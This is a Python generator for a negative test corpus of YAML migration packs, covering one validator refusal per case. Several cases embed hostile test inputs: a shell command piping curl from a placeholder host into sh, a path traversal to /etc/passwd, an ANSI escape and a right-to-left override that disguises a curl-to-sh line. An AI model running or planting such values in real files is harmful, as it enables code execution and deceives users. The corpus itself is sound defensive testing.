#!/usr/bin/env python3
"""Generate the negative pack corpus: one file per documented refusal.

Each case is one edit to an otherwise valid pack, so it is refused for that reason alone. `CASES`
holds the YAML path and message fragment test_all_packs.py expects; each file's header repeats them.
No arguments rewrites the corpus; `--check` reports drift and writes nothing.
"""

from __future__ import annotations

import copy
import sys
from collections.abc import Callable
from dataclasses import dataclass
from pathlib import Path
from typing import Any

import yaml

HERE = Path(__file__).resolve().parent

Document = dict[str, Any]

# The smallest valid pack; each case adds at most one change and alters one thing.
# `.invalid` is a reserved TLD, so the `source` url can never resolve, even if fetched.
MINIMAL: Document = {
    "id": "demo/legacy-to-modern",
    "pack_version": "0.1.0",
    "provider": "demo",
    "language": "python",
    "source": {
        "type": "official_guide",
        "url": "https://example.invalid/guide",
        "retrieved_at": "2026-09-17",
    },
    "from": {"package": "demo-legacy", "version": "<1"},
    "to": {"package": "demo-modern", "version": ">=1"},
    "match": {"imports": ["demo_legacy"], "prefilter_tokens": ["demo_legacy"]},
    "changes": [
        {
            "id": "configure-to-client",
            "kind": "configure_to_client",
            "citation": "Guide, Authentication",
            "fixtures": ["fixtures/negative/none.py", "fixtures/positive/one.before.py"],
            "params": {
                "legacy_symbol": "demo_legacy.configure",
                "client_symbol": "demo_modern.Client",
                "client_name": "client",
                "client_name_fallback": "demo_client",
                "allowed_kwargs": ["api_key", "credentials"],
                "credential_kwarg": "api_key",
                "credentials_object_kwarg": "credentials",
            },
        }
    ],
    "limitations": ["Everything this pack does not list."],
}

# Extra changes for rules in other kinds: the smallest valid form of each.
MODEL_CHANGE: Document = {
    "id": "model-calls",
    "kind": "generative_model_calls",
    "citation": "Guide, Generate content",
    "fixtures": ["fixtures/negative/none.py", "fixtures/positive/one.before.py"],
    "params": {
        "ctor_symbol": "demo_legacy.Model",
        "methods": {"demo_legacy.Model": ["generate"]},
        "generation_config_keys": ["temperature"],
        "safety": {
            "legacy_kwarg": "guards",
            "legacy_category_key": "category",
            "legacy_threshold_key": "threshold",
            "legacy_category_class": "demo_legacy.Harm",
            "legacy_threshold_class": "demo_legacy.Block",
            "category_map": {"harassment": "HARM_CATEGORY_HARASSMENT"},
            "threshold_map": {"low": "BLOCK_LOW_AND_ABOVE"},
            "category_members": ["HARM_CATEGORY_HARASSMENT"],
            "threshold_members": ["BLOCK_LOW_AND_ABOVE"],
            "setting_class": "demo_modern.types.Safety",
            "category_class": "demo_modern.types.Harm",
            "threshold_class": "demo_modern.types.Block",
            "category_kwarg": "category",
            "threshold_kwarg": "threshold",
            "config_field": "safety_settings",
        },
        "config_class": "demo_modern.types.Config",
        "default_model_name": "demo-1",
        "legacy_config_symbol": "demo_legacy.Config",
        "legacy_config_kwarg": "settings",
        "ctor_order": ["name", "guards", "settings"],
        "ctor_model_kwarg": "name",
        "model_kwarg": "model",
        "stream_kwarg": "stream",
        "model_name_prefix": "models/",
        "rewrites": {
            "demo_legacy.Model.generate": {
                "new_call": "models.generate",
                "positional_to_kw": ["contents"],
                "config_kwarg": "config",
            }
        },
    },
}

RENAME_CHANGE: Document = {
    "id": "rename-import",
    "kind": "rename_import",
    "citation": "Guide, Installation",
    "fixtures": ["fixtures/negative/none.py", "fixtures/positive/one.before.py"],
    "params": {
        "from_module": "demo_legacy",
        "to_module": "demo_modern",
        "default_alias": "demo",
        "types_alias_fallback": "demo_types",
        "submodule_map": {"types": "demo_modern.types"},
        "types_symbol_map": {"GenerationConfig": "GenerateContentConfig"},
    },
}

FLAG_CHANGE: Document = {
    "id": "flag-out-of-scope",
    "kind": "flag_only",
    "citation": "Guide, Installation",
    "fixtures": ["fixtures/negative/none.py", "fixtures/positive/one.before.py"],
    "params": {
        "symbols": ["demo_legacy.protos"],
        "message": "This surface has no rule.",
        "suggestion": "Migrate these call sites by hand.",
    },
}

CALL_CHANGE: Document = {
    "id": "measure",
    "kind": "rewrite_call",
    "citation": "Guide, Measuring",
    "fixtures": ["fixtures/negative/none.py", "fixtures/positive/one.before.py"],
    "params": {
        "legacy_symbol": "demo_legacy.measure",
        "new_call": "probe.measure",
        "arg_map": {"body": "text"},
        "positional_to_kw": ["kind", "body"],
        "config_class": "demo_modern.types.MeasureConfig",
        "config_kwarg": "config",
        "config_kwargs": ["depth"],
        "dispatch_prefixes": {"kind": ["kinds/"]},
    },
}

MANIFEST_CHANGE: Document = {
    "id": "manifest-dependency",
    "kind": "manifest_dependency",
    "citation": "Guide, Installation",
    "fixtures": ["fixtures/negative/none.txt", "fixtures/positive/one.before.txt"],
    "params": {"from_name": "demo-legacy", "to_name": "demo-modern", "to_spec": ">=1"},
}

# An extra change is always appended, so it is always `changes[1]`.
EXTRA = "changes[1]"


@dataclass(frozen=True)
class Case:
    """One refusal, the edit that provokes it, and what it must say.

    `path` is the YAML path the error names; `""` means the whole document (cross-field rules).
    `text` replaces the whole file, for cases that are not a YAML mapping at all.
    """

    name: str
    defect: str
    path: str
    says: str
    mutate: Callable[[Document], None] | None = None
    extra: Document | None = None
    text: str | None = None


def _with(document: Document, key: str, value: Any) -> None:
    document[key] = value


def _one_distribution_overlapping(document: Document) -> None:
    """Two ranges over one distribution that both admit 1."""
    document["to"]["package"] = "demo-legacy"
    document["from"]["version"] = "<2"


def _one_distribution_backwards(document: Document) -> None:
    """A target that reaches no higher than the source's floor."""
    document["to"]["package"] = "demo-legacy"
    document["from"]["version"] = ">=2"
    document["to"]["version"] = "<1"


CASES: tuple[Case, ...] = (
    # PACK_SPEC "Validation errors", one case per bullet.
    Case(
        name="unknown_field",
        defect="a top-level field the schema does not define",
        path="homepage",
        says="Extra inputs are not permitted",
        mutate=lambda d: _with(d, "homepage", "https://example.invalid"),
    ),
    Case(
        name="unknown_change_field",
        defect="an unknown field inside a change, which `extra=forbid` reaches too",
        path="changes[0].summary",
        says="Extra inputs are not permitted",
        mutate=lambda d: _with(d["changes"][0], "summary", "renames the import"),
    ),
    Case(
        name="unknown_change_kind",
        defect="a rule kind that is not in the registry",
        path="changes[0]",
        says="does not match any of the expected tags",
        mutate=lambda d: _with(d["changes"][0], "kind", "rewrite_imports"),
    ),
    Case(
        name="unknown_precondition",
        defect="a precondition outside the closed vocabulary",
        path="changes[0].preconditions[1]",
        says="Input should be",
        mutate=lambda d: _with(d["changes"][0], "preconditions", ["import_resolved", "magic"]),
    ),
    Case(
        name="duplicate_change_id",
        defect="two changes with one id, which `Edit.rule_id` could not tell apart",
        path="",
        says="appears twice",
        mutate=lambda d: d["changes"].append(copy.deepcopy(d["changes"][0])),
    ),
    Case(
        name="missing_source_url",
        defect="provenance with no url",
        path="source.url",
        says="Field required",
        mutate=lambda d: d["source"].pop("url"),
    ),
    Case(
        name="missing_source_retrieved_at",
        defect="provenance with no retrieval date",
        path="source.retrieved_at",
        says="Field required",
        mutate=lambda d: d["source"].pop("retrieved_at"),
    ),
    Case(
        name="source_url_is_not_https",
        defect="a source url that is not https, in a field copied into evidence",
        path="source.url",
        says="must be https",
        mutate=lambda d: _with(d["source"], "url", "http://example.invalid/guide"),
    ),
    Case(
        name="language_is_not_python",
        defect="a language this tool does not read",
        path="language",
        says="Input should be 'python'",
        mutate=lambda d: _with(d, "language", "javascript"),
    ),
    Case(
        name="empty_match_imports",
        defect="a pack that matches no import module",
        path="match",
        says="must name at least one module",
        mutate=lambda d: _with(d["match"], "imports", []),
    ),
    Case(
        name="from_version_is_not_pep440",
        defect="a version range that is not a PEP 440 specifier",
        path="from.version",
        says="PEP 440 version specifier",
        mutate=lambda d: _with(d["from"], "version", "~~1"),
    ),
    Case(
        name="version_ranges_overlap",
        defect="two ranges over one distribution that admit the same version",
        path="",
        says="both sides of the migration",
        mutate=_one_distribution_overlapping,
    ),
    Case(
        name="version_ranges_move_backwards",
        defect="a target range that reaches no higher than the source's floor",
        path="",
        says="move backwards",
        mutate=_one_distribution_backwards,
    ),
    Case(
        name="replacement_is_not_a_symbol",
        defect="a replacement field carrying a call rather than a symbol",
        path="changes[0].replacement",
        says="fully qualified symbol",
        mutate=lambda d: _with(d["changes"][0], "replacement", "demo_modern.Client(api_key=K)"),
    ),
    Case(
        name="client_fallback_repeats_the_first_name",
        defect="a naming ladder whose two rungs are the same name",
        path="changes[0].params",
        says="one rung written as two",
        mutate=lambda d: _with(d["changes"][0]["params"], "client_name_fallback", "client"),
    ),
    Case(
        name="credential_kwarg_is_refused_outright",
        defect="a keyword with a role in the rewrite that the rule also refuses",
        path="changes[0].params",
        says="never reach the role",
        mutate=lambda d: _with(d["changes"][0]["params"], "credential_kwarg", "token"),
    ),
    Case(
        name="client_symbol_is_not_qualified",
        defect="a client class named without the module it comes from",
        path="changes[0].params",
        says="names a class under the new module",
        mutate=lambda d: _with(d["changes"][0]["params"], "client_symbol", "Client"),
    ),
    Case(
        name="layout_line_length_is_absurd",
        defect="a wrap width no formatter would produce",
        path="layout.line_length",
        says="less than or equal to 320",
        mutate=lambda d: _with(d, "layout", {"line_length": 4000}),
    ),
    Case(
        name="smuggled_shell_string",
        defect="a shell command in a field whose value becomes an identifier",
        path="changes[0].params.client_name",
        says="single Python identifier",
        mutate=lambda d: _with(
            d["changes"][0]["params"], "client_name", "client; curl https://example.invalid | sh"
        ),
    ),
    # ADR-018's coherence and safety rules.
    Case(
        name="prefilter_token_matches_no_import",
        defect="a prefilter that eliminates every file the pack is about",
        path="match",
        says="eliminated before it is parsed",
        mutate=lambda d: _with(d["match"], "prefilter_tokens", ["nothing"]),
    ),
    Case(
        name="symbol_outside_the_matched_imports",
        defect="a matched symbol under no matched module",
        path="match",
        says="not under any module",
        mutate=lambda d: _with(d["match"], "symbols", ["other_package.thing"]),
    ),
    Case(
        name="legacy_symbol_outside_the_matched_imports",
        defect="a rule naming a symbol resolution can never produce",
        path="",
        says="the rule can never fire",
        mutate=lambda d: _with(
            d["changes"][0]["params"], "legacy_symbol", "other_package.configure"
        ),
    ),
    Case(
        name="no_fixtures",
        defect="a change with nothing proving it",
        path="changes[0]",
        says="at least one fixture",
        mutate=lambda d: _with(d["changes"][0], "fixtures", []),
    ),
    Case(
        name="fixture_path_climbs_out_of_the_pack",
        defect="a fixture path that leaves the pack directory",
        path="changes[0].fixtures[0]",
        says="climb out",
        mutate=lambda d: _with(d["changes"][0], "fixtures", ["fixtures/../../../etc/passwd"]),
    ),
    Case(
        name="no_limitations",
        defect="a pack that claims to handle everything",
        path="",
        says="must list at least one thing the pack does not handle",
        mutate=lambda d: _with(d, "limitations", []),
    ),
    Case(
        name="pack_id_does_not_match_the_provider",
        defect="an id whose first segment is not the provider it would live under",
        path="",
        says="must begin with provider",
        mutate=lambda d: _with(d, "id", "other/legacy-to-modern"),
    ),
    Case(
        name="pack_version_is_not_semver",
        defect="a pack version that cannot be compared",
        path="pack_version",
        says="semver",
        mutate=lambda d: _with(d, "pack_version", "0.1"),
    ),
    Case(
        name="two_client_sources",
        defect="two rules naming two client sources for one module",
        path="",
        says="found 2",
        mutate=lambda d: d["changes"].append(
            {**copy.deepcopy(d["changes"][0]), "id": "configure-to-client-again"}
        ),
    ),
    Case(
        name="escape_sequence_in_a_message",
        defect="an ANSI escape in prose a terminal renders verbatim",
        path=f"{EXTRA}.params.message",
        says="control, format or surrogate",
        extra=FLAG_CHANGE,
        mutate=lambda d: _with(
            d["changes"][1]["params"], "message", "This surface has no rule.\x1b[2K\rMigrated."
        ),
    ),
    Case(
        name="right_to_left_override_in_a_suggestion",
        defect="a bidirectional override, which makes a suggestion read backwards",
        path="verification.suggestions[0]",
        says="control, format or surrogate",
        mutate=lambda d: _with(
            d, "verification", {"suggestions": ["pytest -q  # ‮sh | detsurtnu lruc"]}
        ),
    ),
    # Rules that live inside one kind.
    Case(
        name="no_client_source",
        defect="a pack with rules and no client source at all",
        path="",
        says="found 0",
        extra=MODEL_CHANGE,
        mutate=lambda d: d["changes"].pop(0),
    ),
    Case(
        name="seed_is_not_a_legacy_config_key",
        defect="a configuration key that exists only on the new side",
        path=f"{EXTRA}.params",
        says="must not carry ['seed']",
        extra=MODEL_CHANGE,
        mutate=lambda d: _with(
            d["changes"][1]["params"], "generation_config_keys", ["seed", "temperature"]
        ),
    ),
    Case(
        name="dangerous_content_is_not_a_safety_key",
        defect="a safety key the legacy lookup raised KeyError for",
        path=f"{EXTRA}.params.safety",
        says="must not accept ['dangerous_content']",
        extra=MODEL_CHANGE,
        mutate=lambda d: d["changes"][1]["params"]["safety"]["category_map"].update(
            {"dangerous_content": "HARM_CATEGORY_DANGEROUS_CONTENT"}
        ),
    ),
    Case(
        name="harm_category_hate_is_never_emitted",
        defect="a member name that exists in neither SDK and is fabricated silently",
        path=f"{EXTRA}.params.safety",
        says="must never carry ['HARM_CATEGORY_HATE']",
        extra=MODEL_CHANGE,
        mutate=lambda d: _with(
            d["changes"][1]["params"]["safety"],
            "category_members",
            ["HARM_CATEGORY_HARASSMENT", "HARM_CATEGORY_HATE"],
        ),
    ),
    Case(
        name="a_safety_map_that_reaches_past_its_members",
        defect="a table emitting a member the enum does not declare",
        path=f"{EXTRA}.params.safety",
        says="which category_members does not declare",
        extra=MODEL_CHANGE,
        mutate=lambda d: _with(
            d["changes"][1]["params"]["safety"],
            "category_map",
            {"harassment": "HARM_CATEGORY_HARASSMENT", "hate": "HARM_CATEGORY_HATE_SPEECH"},
        ),
    ),
    Case(
        name="one_enum_for_both_halves_of_a_safety_row",
        defect="the same legacy enum named as the category's and the threshold's",
        path=f"{EXTRA}.params.safety",
        says="makes a threshold readable as a category",
        extra=MODEL_CHANGE,
        mutate=lambda d: _with(
            d["changes"][1]["params"]["safety"], "legacy_threshold_class", "demo_legacy.Harm"
        ),
    ),
    Case(
        name="a_safety_class_under_another_module",
        defect="a class the rule emits that its one import could not reach",
        path=f"{EXTRA}.params",
        says="every class this rule emits is reached through the one name",
        extra=MODEL_CHANGE,
        mutate=lambda d: _with(
            d["changes"][1]["params"]["safety"], "setting_class", "demo_modern.safety.Safety"
        ),
    ),
    Case(
        name="the_safety_keyword_is_outside_the_signature",
        defect="a safety table on a constructor parameter the signature does not have",
        path=f"{EXTRA}.params",
        says="which is not a parameter in ctor_order",
        extra=MODEL_CHANGE,
        mutate=lambda d: _with(
            d["changes"][1]["params"]["safety"], "legacy_kwarg", "safety_settings"
        ),
    ),
    Case(
        name="a_safety_enum_under_no_imported_module",
        defect="a legacy enum resolution can never produce",
        path="",
        says="params.safety.legacy_category_class names",
        extra=MODEL_CHANGE,
        mutate=lambda d: _with(
            d["changes"][1]["params"]["safety"], "legacy_category_class", "other_legacy.Harm"
        ),
    ),
    Case(
        name="safety_key_is_not_lower_case",
        defect="a safety table with two spellings of one key",
        path=f"{EXTRA}.params.safety.category_map.HATE",
        says="matched case-insensitively",
        extra=MODEL_CHANGE,
        mutate=lambda d: _with(
            d["changes"][1]["params"]["safety"],
            "category_map",
            {"HATE": "HARM_CATEGORY_HATE_SPEECH"},
        ),
    ),
    Case(
        name="constructor_has_no_method_list",
        defect="a constructor whose receiver declares no supported method",
        path=f"{EXTRA}.params",
        says="methods has no entry for ctor_symbol",
        extra=MODEL_CHANGE,
        mutate=lambda d: _with(
            d["changes"][1]["params"], "methods", {"demo_legacy.Chat": ["send"]}
        ),
    ),
    Case(
        name="generation_config_mapped_to_itself",
        defect="an identity rewrite that imports cleanly and does nothing",
        path=f"{EXTRA}.params",
        says="to itself",
        extra=RENAME_CHANGE,
        mutate=lambda d: _with(
            d["changes"][1]["params"], "types_symbol_map", {"GenerationConfig": "GenerationConfig"}
        ),
    ),
    Case(
        name="types_symbol_map_without_a_submodule_map",
        defect="renamed submodule symbols with nothing saying where the submodule went",
        path=f"{EXTRA}.params",
        says="where that submodule moved to",
        extra=RENAME_CHANGE,
        mutate=lambda d: d["changes"][1]["params"].pop("submodule_map"),
    ),
    Case(
        name="symbol_both_rewritten_and_refused",
        defect="one symbol with two answers, decided by the order of the list",
        path="",
        says="both rewritten and refused",
        extra=FLAG_CHANGE,
        mutate=lambda d: _with(d["changes"][1]["params"], "symbols", ["demo_legacy.configure"]),
    ),
    Case(
        name="manifest_names_a_third_distribution",
        defect="a dependency rule pinning a distribution this pack does not migrate",
        path="",
        says="is not this migration",
        extra=MANIFEST_CHANGE,
        mutate=lambda d: _with(d["changes"][1]["params"], "to_name", "something-else"),
    ),
    Case(
        name="method_returns_names_no_such_method",
        defect="a return recorded for a method the rule does not support",
        path=f"{EXTRA}.params",
        says="is not a supported method",
        extra=MODEL_CHANGE,
        mutate=lambda d: _with(
            d["changes"][1]["params"],
            "method_returns",
            {"demo_legacy.Model.rewind": "demo_legacy.Model"},
        ),
    ),
    Case(
        name="method_returns_a_receiver_with_no_methods",
        defect="a receiver the scanner could hold and do nothing with",
        path=f"{EXTRA}.params",
        says="has no method list",
        extra=MODEL_CHANGE,
        mutate=lambda d: _with(
            d["changes"][1]["params"],
            "method_returns",
            {"demo_legacy.Model.generate": "demo_legacy.Session"},
        ),
    ),
    Case(
        name="method_returns_its_own_receiver",
        defect="an entry that says a method hands back the object it was called on",
        path=f"{EXTRA}.params",
        says="needs no entry",
        extra=MODEL_CHANGE,
        mutate=lambda d: _with(
            d["changes"][1]["params"],
            "method_returns",
            {"demo_legacy.Model.generate": "demo_legacy.Model"},
        ),
    ),
    Case(
        name="a_receiver_nothing_can_produce",
        defect="a receiver with methods, no constructor and no method that returns it",
        path=f"{EXTRA}.params",
        says="nothing in this pack produces",
        extra=MODEL_CHANGE,
        mutate=lambda d: _with(
            d["changes"][1]["params"],
            "methods",
            {"demo_legacy.Model": ["generate"], "demo_legacy.Session": ["ask"]},
        ),
    ),
    # What the constructor and its calls must add up to.
    Case(
        name="a_constructor_with_no_parameters",
        defect="a legacy signature with nothing in it, which no call can match",
        path=f"{EXTRA}.params",
        says="a constructor has parameters",
        extra=MODEL_CHANGE,
        mutate=lambda d: _with(d["changes"][1]["params"], "ctor_order", []),
    ),
    Case(
        name="ctor_kwarg_outside_the_signature",
        defect="a destination for a constructor parameter the signature does not have",
        path=f"{EXTRA}.params",
        says="which is not a parameter in ctor_order",
        extra=MODEL_CHANGE,
        mutate=lambda d: _with(d["changes"][1]["params"], "ctor_model_kwarg", "model_name"),
    ),
    Case(
        name="ctor_kwarg_placed_twice",
        defect="one constructor parameter given two destinations",
        path=f"{EXTRA}.params",
        says="a constructor parameter has one destination or none",
        extra=MODEL_CHANGE,
        mutate=lambda d: _with(d["changes"][1]["params"], "ctor_config_fields", ["settings"]),
    ),
    Case(
        name="ctor_order_repeats_a_parameter",
        defect="a signature that names one parameter twice",
        path=f"{EXTRA}.params",
        says="must not repeat an entry",
        extra=MODEL_CHANGE,
        mutate=lambda d: _with(d["changes"][1]["params"], "ctor_order", ["name", "name"]),
    ),
    Case(
        name="a_rewrite_for_no_supported_method",
        defect="a rewrite for a method no receiver declares, which nothing can reach",
        path=f"{EXTRA}.params",
        says="which is not a supported method of any receiver",
        extra=MODEL_CHANGE,
        mutate=lambda d: _with(
            d["changes"][1]["params"],
            "rewrites",
            {"demo_legacy.Model.stream": {"new_call": "models.stream"}},
        ),
    ),
    Case(
        name="a_stream_call_that_is_the_same_method",
        defect="a streaming target identical to the plain one, which loses the keyword",
        path=f"{EXTRA}.params.rewrites.demo_legacy.Model.generate",
        says="makes the stream keyword disappear silently",
        extra=MODEL_CHANGE,
        mutate=lambda d: _with(
            d["changes"][1]["params"],
            "rewrites",
            {
                "demo_legacy.Model.generate": {
                    "new_call": "models.generate",
                    "stream_call": "models.generate",
                }
            },
        ),
    ),
    Case(
        name="semantic_kwargs_on_a_call_that_carries_config",
        defect="constructor keywords that may not be dropped, on a call that drops nothing",
        path=f"{EXTRA}.params.rewrites.demo_legacy.Model.generate",
        says="one of the two is wrong",
        extra=MODEL_CHANGE,
        mutate=lambda d: _with(
            d["changes"][1]["params"],
            "rewrites",
            {
                "demo_legacy.Model.generate": {
                    "new_call": "models.generate",
                    "config_kwarg": "config",
                    "semantic_kwargs": ["settings"],
                }
            },
        ),
    ),
    Case(
        name="the_configuration_class_claimed_twice",
        defect="the claimed configuration spelling repeated as an alias another rule owns",
        path=f"{EXTRA}.params",
        says="one symbol has one rule that rewrites it",
        extra=MODEL_CHANGE,
        mutate=lambda d: _with(
            d["changes"][1]["params"], "legacy_config_aliases", ["demo_legacy.Config"]
        ),
    ),
    Case(
        name="a_response_attribute_with_no_exception",
        defect="half of the response shape, which is not recognisable from one end",
        path=f"{EXTRA}.params",
        says="response_attrs_now_none and response_legacy_error are one fact",
        extra=MODEL_CHANGE,
        mutate=lambda d: _with(d["changes"][1]["params"], "response_attrs_now_none", ["text"]),
    ),
    # What the chat surface and the async methods must add up to.
    Case(
        name="a_history_keyword_with_no_shape",
        defect="a value that is rewritten, with nothing saying into what",
        path=f"{EXTRA}.params",
        says="and nothing says into what",
        extra=MODEL_CHANGE,
        mutate=lambda d: _with(
            d["changes"][1]["params"],
            "rewrites",
            {
                "demo_legacy.Model.generate": {
                    "new_call": "models.generate",
                    "history_kwarg": "history",
                }
            },
        ),
    ),
    Case(
        name="a_history_role_table_with_one_key_twice",
        defect="one key of a history entry named as both halves of it",
        path=f"{EXTRA}.params.history",
        says="two keys of one entry, not one",
        extra=MODEL_CHANGE,
        mutate=lambda d: _with(
            d["changes"][1]["params"],
            "history",
            {"role_key": "role", "parts_key": "role", "text_key": "text", "roles": ["user"]},
        ),
    ),
    Case(
        name="a_client_call_that_names_no_service",
        defect="a call rooted on the client with nothing between it and the method",
        path=f"{EXTRA}.params.rewrites.demo_legacy.Model.generate",
        says="names a service and a method on it",
        extra=MODEL_CHANGE,
        mutate=lambda d: _with(
            d["changes"][1]["params"],
            "rewrites",
            {"demo_legacy.Model.generate": {"new_call": "generate"}},
        ),
    ),
    Case(
        name="a_receiver_call_that_names_a_service",
        defect="a path off an object that has no such attribute",
        path=f"{EXTRA}.params.rewrites.demo_legacy.Model.generate",
        says="names a method of that object and nothing in front of it",
        extra=MODEL_CHANGE,
        mutate=lambda d: _with(
            d["changes"][1]["params"],
            "rewrites",
            {
                "demo_legacy.Model.generate": {
                    "root": "receiver",
                    "new_call": "models.generate",
                }
            },
        ),
    ),
    Case(
        name="a_rename_for_an_argument_the_call_cannot_take",
        defect="a keyword rename no call can reach",
        path=f"{EXTRA}.params.rewrites.demo_legacy.Model.generate",
        says="no call can reach the rename",
        extra=MODEL_CHANGE,
        mutate=lambda d: _with(
            d["changes"][1]["params"],
            "rewrites",
            {
                "demo_legacy.Model.generate": {
                    "new_call": "models.generate",
                    "positional_to_kw": ["contents"],
                    "arg_map": {"prompt": "contents"},
                }
            },
        ),
    ),
    Case(
        name="two_legacy_keywords_renamed_onto_one",
        defect="two arguments mapped onto one, so one of them is lost",
        path=f"{EXTRA}.params.rewrites.demo_legacy.Model.generate",
        says="maps two legacy keywords onto one new one",
        extra=MODEL_CHANGE,
        mutate=lambda d: _with(
            d["changes"][1]["params"],
            "rewrites",
            {
                "demo_legacy.Model.generate": {
                    "new_call": "models.generate",
                    "positional_to_kw": ["content", "prompt"],
                    "arg_map": {"content": "contents", "prompt": "contents"},
                }
            },
        ),
    ),
    Case(
        name="a_new_call_that_is_not_a_dotted_path",
        defect="a replacement that is an expression rather than a name",
        path=f"{EXTRA}.params.rewrites.demo_legacy.Model.generate.new_call",
        says="expected a dotted path under the client",
        extra=MODEL_CHANGE,
        mutate=lambda d: _with(
            d["changes"][1]["params"],
            "rewrites",
            {"demo_legacy.Model.generate": {"new_call": "models.generate()"}},
        ),
    ),
    Case(
        name="a_history_keyword_that_is_also_carried",
        defect="one keyword both reshaped and moved, which the rule order would decide",
        path=f"{EXTRA}.params.rewrites.demo_legacy.Model.generate",
        says="which another field already claims",
        extra=MODEL_CHANGE,
        mutate=lambda d: _with(
            d["changes"][1]["params"],
            "rewrites",
            {
                "demo_legacy.Model.generate": {
                    "new_call": "models.generate",
                    "positional_to_kw": ["history"],
                    "history_kwarg": "history",
                }
            },
        ),
    ),
    Case(
        name="a_refused_keyword_that_is_also_carried",
        defect="one keyword both refused and moved, which the rule order would decide",
        path=f"{EXTRA}.params.rewrites.demo_legacy.Model.generate",
        says="is refused or it is carried, not both",
        extra=MODEL_CHANGE,
        mutate=lambda d: _with(
            d["changes"][1]["params"],
            "rewrites",
            {
                "demo_legacy.Model.generate": {
                    "new_call": "models.generate",
                    "positional_to_kw": ["tools"],
                    "afc_kwargs": ["tools"],
                }
            },
        ),
    ),
    Case(
        name="an_empty_model_name_prefix",
        defect="a prefix every literal has, so every edit would carry the warning",
        path=f"{EXTRA}.params",
        says="an empty one is a prefix every literal has",
        extra=MODEL_CHANGE,
        mutate=lambda d: _with(d["changes"][1]["params"], "model_name_prefix", ""),
    ),
    # Documents that are not a pack at all.
    Case(
        name="duplicate_yaml_key",
        defect="one key twice, which YAML resolves by discarding the first",
        path="",
        says="duplicate key 'provider'",
        text="__DUPLICATE__",
    ),
    # rewrite_call: the parameter lists must agree with each other.
    Case(
        name="a_config_class_with_no_keyword_to_pass_it_under",
        defect="a configuration class the emitted call has no name for",
        path=f"{EXTRA}.params",
        says="config_class, config_kwargs and config_kwarg go together",
        extra=CALL_CHANGE,
        mutate=lambda d: d["changes"][1]["params"].pop("config_kwarg"),
    ),
    Case(
        name="a_parameter_that_is_an_argument_and_a_config_field",
        defect="a parameter named in both destinations, so the rule's order decides",
        path=f"{EXTRA}.params",
        says="is in positional_to_kw and in config_kwargs",
        extra=CALL_CHANGE,
        mutate=lambda d: _with(d["changes"][1]["params"], "config_kwargs", ["body", "depth"]),
    ),
    Case(
        name="a_renamed_parameter_no_list_names",
        defect="an arg_map row for a parameter the rule never reads",
        path=f"{EXTRA}.params",
        says="arg_map renames ['weight']",
        extra=CALL_CHANGE,
        mutate=lambda d: d["changes"][1]["params"]["arg_map"].update({"weight": "mass"}),
    ),
    Case(
        name="two_parameters_that_land_on_one_keyword",
        defect="a rename onto a name another parameter already carries",
        path=f"{EXTRA}.params",
        says="land on ['kind'] once arg_map is applied",
        extra=CALL_CHANGE,
        mutate=lambda d: d["changes"][1]["params"]["arg_map"].update({"body": "kind"}),
    ),
    Case(
        name="a_dispatch_prefix_on_a_parameter_no_list_names",
        defect="a prefix list the rule would never consult",
        path=f"{EXTRA}.params",
        says="dispatch_prefixes names ['flavour']",
        extra=CALL_CHANGE,
        mutate=lambda d: d["changes"][1]["params"]["dispatch_prefixes"].update(
            {"flavour": ["kinds/"]}
        ),
    ),
    Case(
        name="a_dispatch_prefix_list_with_nothing_in_it",
        defect="a prefix list that refuses every call rather than naming one that carries",
        path=f"{EXTRA}.params",
        says="is empty, which refuses every call",
        extra=CALL_CHANGE,
        mutate=lambda d: _with(d["changes"][1]["params"], "dispatch_prefixes", {"kind": []}),
    ),
    Case(
        name="a_dispatch_prefix_list_that_is_not_sorted",
        defect="a prefix list with two spellings of one set",
        path=f"{EXTRA}.params",
        says="must be sorted and de-duplicated",
        extra=CALL_CHANGE,
        mutate=lambda d: _with(
            d["changes"][1]["params"], "dispatch_prefixes", {"kind": ["kinds/", "flavours/"]}
        ),
    ),
    Case(
        name="an_empty_dispatch_prefix",
        defect="a prefix every string begins with",
        path=f"{EXTRA}.params.dispatch_prefixes.kind[0]",
        says="must not be empty",
        extra=CALL_CHANGE,
        mutate=lambda d: _with(d["changes"][1]["params"], "dispatch_prefixes", {"kind": [""]}),
    ),
    Case(
        name="a_dispatch_prefix_with_a_control_character",
        defect="a prefix carrying bytes a terminal would act on",
        path=f"{EXTRA}.params.dispatch_prefixes.kind[0]",
        says="the literal start of an argument",
        extra=CALL_CHANGE,
        mutate=lambda d: _with(
            d["changes"][1]["params"], "dispatch_prefixes", {"kind": ["kinds/\x1b[2K"]}
        ),
    ),
    Case(
        name="not_a_mapping",
        defect="a sequence where a mapping of fields belongs",
        path="",
        says="and this one is a list",
        text="- id: demo/legacy-to-modern\n- pack_version: 0.1.0\n",
    ),
    Case(
        name="not_valid_yaml",
        defect="a document the parser cannot read at all",
        path="",
        says="line ",
        text="pack_version: 0.1.0\nid: [demo/legacy-to-modern\n",
    ),
    Case(
        name="only_comments",
        defect="a file with no document in it",
        path="",
        says="the file is empty",
        text="",
    ),
)


def _header(case: Case) -> str:
    where = f"`{case.path}`" if case.path else "the document as a whole"
    return (
        f"# Negative pack: {case.defect}.\n"
        f"#\n"
        f"# `obelize pack validate` must exit 7 on this file, and the refusal must\n"
        f"# name {where} and say {case.says!r}.\n"
        f"#\n"
        f"# Generated by tests/packs/_negative/_build.py -- do not edit by hand.\n"
    )


def document(case: Case) -> Document:
    built = copy.deepcopy(MINIMAL)
    if case.extra is not None:
        built["changes"].append(copy.deepcopy(case.extra))
    if case.mutate is not None:
        case.mutate(built)
    return built


def render(case: Case) -> bytes:
    """The exact bytes of one committed negative pack."""
    if case.text == "__DUPLICATE__":
        body = yaml.safe_dump(document(case), sort_keys=False, default_flow_style=False)
        body = body.replace("provider: demo\n", "provider: demo\nprovider: demo\n", 1)
    elif case.text is not None:
        body = case.text
    else:
        body = yaml.safe_dump(
            document(case), sort_keys=False, default_flow_style=False, allow_unicode=False
        )
    return (_header(case) + body).encode("utf-8")


def build() -> dict[str, bytes]:
    return {f"{case.name}.yaml": render(case) for case in CASES}


def verify(expected: dict[str, bytes]) -> bool:
    """Compare the committed files with `expected`; writes nothing."""
    ok = True
    on_disk = {path.name for path in HERE.glob("*.yaml")}
    for extra in sorted(on_disk - set(expected)):
        print(f"stale: {extra} is not produced by any case", file=sys.stderr)
        ok = False
    for name, data in expected.items():
        path = HERE / name
        current = path.read_bytes() if path.exists() else None
        if current != data:
            print(f"drift: {name}", file=sys.stderr)
            ok = False
    return ok


def main(argv: list[str] | None = None) -> int:
    arguments = list(sys.argv[1:] if argv is None else argv)
    expected = build()
    if arguments == ["--check"]:
        if verify(expected):
